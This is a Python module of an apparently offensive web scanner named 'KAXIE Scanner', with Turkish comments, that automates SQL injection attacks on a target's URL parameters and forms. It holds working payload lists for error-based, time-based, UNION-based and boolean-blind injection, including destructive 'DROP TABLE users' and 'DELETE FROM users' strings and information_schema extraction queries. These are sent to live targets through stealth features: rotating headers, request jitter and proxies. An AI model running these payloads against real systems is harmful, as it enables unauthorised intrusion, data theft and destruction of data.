"""
KAXIE Scanner - SQL Injection Tarama Modülü
"""

import requests
import re
import time
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from config import SCAN_CONFIG, Colors
from utils.stealth import StealthManager
from utils.payload_gen import PayloadGenerator


class SQLiScanner:
    """SQL Injection zafiyetlerini tespit eden sınıf."""

    def __init__(self, target, reporter, ai_engine=None, forms=None, links=None):
        self.target = target
        self.reporter = reporter
        self.ai_engine = ai_engine
        self.forms = forms or []
        self.links = links or []
        self.stealth = StealthManager()
        self.payload_gen = PayloadGenerator()
        self.session = requests.Session()
        self.session.verify = SCAN_CONFIG["verify_ssl"]
        self.vulnerable = []

    def run(self):
        """Tüm SQLi testlerini çalıştırır."""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] SQL INJECTION TARAMASI BAŞLADI{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] Hedef: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        self._test_error_based()
        self._test_time_based()
        self._test_union_based()
        self._test_blind_boolean()
        self._test_forms_sqli()

        if self.ai_engine and self.ai_engine.selected_model and self.vulnerable:
            print(f"\n{Colors.MAGENTA}  [*] AI SQLi analizi yapılıyor...{Colors.RESET}")
            for v in self.vulnerable:
                analysis = self.ai_engine.analyze_vulnerability(
                    vuln_type="SQL_INJECTION",
                    target=v["url"],
                    evidence=v["evidence"],
                    response_snippet=v.get("response", ""),
                )
                if analysis:
                    self.reporter.add_ai_analysis("SQL_INJECTION", analysis)

        return self.vulnerable

    def _make_request(self, url, method="GET", data=None, headers=None):
        """İstek yapar."""
        if headers is None:
            headers = self.stealth.get_headers(self.target)
        self.stealth.jitter_delay()

        try:
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            else:
                resp = self.session.post(url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            self.reporter.scan_stats["total_requests"] += 1
            return resp
        except Exception:
            return None

    def _get_error_signatures(self):
        """SQL hata imzalarını döndürür."""
        return [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL.*Server",
            r"OLE DB.*SQL.*Server",
            r"(\W|\A)SQL.*Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}",
            r"Exception.*Oracle",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
            r"Microsoft.*OLE.*DB.*Oracle",
            r"SQLite/JDBCDriver",
            r"SQLite.*Driver",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLite_ERROR\]",
            r"ODBC.*SQL.*Server.*Driver",
            r"ODBC.*Driver.*Manager",
            r"OLE.*DB.*error",
            r"Microsoft.*OLE.*DB.*error",
            r"CLI Driver.*DB2",
            r"DB2 SQL error",
            r"\bdb2_\w+\(",
            r"SQLSTATE+\d+",
            r"SQLSTATE.*ERROR",
            r"\[IBM\]\[CLI Driver\]\[DB2\/6000\]",
            r"Sybase.*Server message",
            r"SybSQLException",
            r"Warning.*sybase.*",
            r"Dynamic SQL Error",
            r"Warning.*ibase_.*",
            r"Exception.*Informix",
            r"SQL error.*POS([0-9]+).*",
            r"Warning.*maxdb.*",
        ]

    def _test_error_based(self):
        """Error-based SQLi testi."""
        print(f"\n  {Colors.BLUE}[*] Error-based SQLi testi...{Colors.RESET}")

        error_payloads = [
            "'", "\"", "\\", ";", "')", "\")", "';", "\";", "'--", "\"--",
            "1'", "1\"", "1\\", "1')", "1\")", "1';", "1\";", "1'--", "1\"--",
            "' AND 1=1", "' AND 1=2", "' OR '1'='1", "' OR '1'='1'--",
            "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
            "1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users;--", "'; DELETE FROM users;--",
        ]

        test_urls = []
        parsed_base = urlparse(self.target)
        if parsed_base.query:
            test_urls.append(self.target)

        for link in self.links[:20]:
            parsed = urlparse(link)
            if parsed.query:
                test_urls.append(link)

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in error_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    resp = self._make_request(test_url)
                    if resp:
                        for signature in self._get_error_signatures():
                            if re.search(signature, resp.text, re.IGNORECASE):
                                evidence = f"Param: {param_name}, Payload: {payload}, Error: {signature[:50]}"
                                self.reporter.add_finding(
                                    vuln_type="SQL_INJECTION",
                                    severity="CRITICAL",
                                    title=f"Error-based SQLi tespit edildi ({param_name})",
                                    description="Veritabanı hata mesajı döndü. SQL enjeksiyonu doğrulandı.",
                                    evidence=evidence,
                                    url=test_url,
                                )
                                self.vulnerable.append({
                                    "url": test_url,
                                    "param": param_name,
                                    "type": "error-based",
                                    "payload": payload,
                                    "evidence": evidence,
                                    "response": resp.text[:300],
                                })
                                break

    def _test_time_based(self):
        """Time-based blind SQLi testi."""
        print(f"\n  {Colors.BLUE}[*] Time-based blind SQLi testi...{Colors.RESET}")

        time_payloads = [
            ("' OR SLEEP(5)--", 5),
            ("\" OR SLEEP(5)--", 5),
            ("' AND SLEEP(5)--", 5),
            ("1' AND SLEEP(5)--", 5),
            ("1' AND pg_sleep(5)--", 5),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ("1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("1; WAITFOR DELAY '0:0:5'--", 5),
            ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--", 5),
            ("1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", 5),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1", 5),
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for payload, expected_delay in time_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                start = time.time()
                resp = self._make_request(test_url)
                elapsed = time.time() - start

                if elapsed >= expected_delay - 1:
                    evidence = f"Time-based SQLi confirmed. Param: {param_name}, Payload: {payload}, Delay: {elapsed:.1f}s"
                    self.reporter.add_finding(
                        vuln_type="SQL_INJECTION",
                        severity="CRITICAL",
                        title=f"Time-based blind SQLi ({param_name})",
                        description="Zaman tabanlı SQL enjeksiyonu doğrulandı.",
                        evidence=evidence,
                        url=test_url,
                    )
                    self.vulnerable.append({
                        "url": test_url,
                        "param": param_name,
                        "type": "time-based",
                        "payload": payload,
                        "evidence": evidence,
                        "response": "",
                    })
                    break

    def _test_union_based(self):
        """UNION-based SQLi testi."""
        print(f"\n  {Colors.BLUE}[*] UNION-based SQLi testi...{Colors.RESET}")

        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT '1','2','3'--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT version(),NULL,NULL--",
            "' UNION SELECT database(),user(),NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for payload in union_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    if re.search(r"NULL|@@version|PostgreSQL|MariaDB|MySQL|Oracle|Microsoft SQL Server", resp.text, re.IGNORECASE):
                        if "error" not in resp.text.lower() or resp.status_code == 200:
                            evidence = f"UNION SQLi. Param: {param_name}, Payload: {payload}"
                            self.reporter.add_finding(
                                vuln_type="SQL_INJECTION",
                                severity="CRITICAL",
                                title=f"UNION-based SQLi ({param_name})",
                                description="UNION SELECT payload'ı çalıştı. Veritabanı bilgisi sızdırılabilir.",
                                evidence=evidence,
                                url=test_url,
                            )
                            self.vulnerable.append({
                                "url": test_url,
                                "param": param_name,
                                "type": "union-based",
                                "payload": payload,
                                "evidence": evidence,
                                "response": resp.text[:300],
                            })
                            break

    def _test_blind_boolean(self):
        """Boolean-based blind SQLi testi."""
        print(f"\n  {Colors.BLUE}[*] Boolean-based blind SQLi testi...{Colors.RESET}")

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            original_val = params[param_name][0] if params[param_name] else "1"

            true_payload = f"{original_val}' AND '1'='1"
            false_payload = f"{original_val}' AND '1'='2"

            test_params_true = params.copy()
            test_params_true[param_name] = [true_payload]
            url_true = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_true, doseq=True)}"

            test_params_false = params.copy()
            test_params_false[param_name] = [false_payload]
            url_false = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_false, doseq=True)}"

            resp_true = self._make_request(url_true)
            resp_false = self._make_request(url_false)

            if resp_true and resp_false:
                len_true = len(resp_true.text)
                len_false = len(resp_false.text)

                if abs(len_true - len_false) > 50:
                    evidence = f"Boolean blind SQLi. True: {len_true} bytes, False: {len_false} bytes"
                    self.reporter.add_finding(
                        vuln_type="SQL_INJECTION",
                        severity="HIGH",
                        title=f"Boolean-based blind SQLi ({param_name})",
                        description="Boolean koşulları farklı yanıt boyutları üretiyor. Blind SQLi mümkün.",
                        evidence=evidence,
                        url=self.target,
                    )
                    self.vulnerable.append({
                        "url": self.target,
                        "param": param_name,
                        "type": "boolean-blind",
                        "payload": f"True: {true_payload}, False: {false_payload}",
                        "evidence": evidence,
                        "response": "",
                    })
                    break

    def _test_forms_sqli(self):
        """Form alanlarında SQLi testi."""
        print(f"\n  {Colors.BLUE}[*] Form alanlarında SQLi testi...{Colors.RESET}")

        if not self.forms:
            print(f"    {Colors.DIM}[-] Form bulunamadı{Colors.RESET}")
            return

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' OR '1'='1",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users;--",
        ]

        for form in self.forms[:10]:
            action = form.get("action", self.target)
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])

            text_inputs = [i for i in inputs if i.get("type", "text").lower() in ["text", "password", "search", "hidden", ""]]

            for inp in text_inputs:
                param_name = inp.get("name", "")
                if not param_name:
                    continue

                for payload in payloads:
                    data = {i.get("name", f"f_{j}"): "test" for j, i in enumerate(inputs) if i.get("name")}
                    data[param_name] = payload

                    resp = self._make_request(action, method=method, data=data)
                    if resp:
                        for signature in self._get_error_signatures():
                            if re.search(signature, resp.text, re.IGNORECASE):
                                evidence = f"Form: {action}, Field: {param_name}, Payload: {payload}"
                                self.reporter.add_finding(
                                    vuln_type="SQL_INJECTION",
                                    severity="CRITICAL",
                                    title=f"Form-based SQLi ({param_name})",
                                    description="Form alanı üzerinden SQL enjeksiyonu tespit edildi.",
                                    evidence=evidence,
                                    url=action,
                                )
                                self.vulnerable.append({
                                    "url": action,
                                    "param": param_name,
                                    "type": "form-based",
                                    "payload": payload,
                                    "evidence": evidence,
                                    "response": resp.text[:300],
                                })
                                break
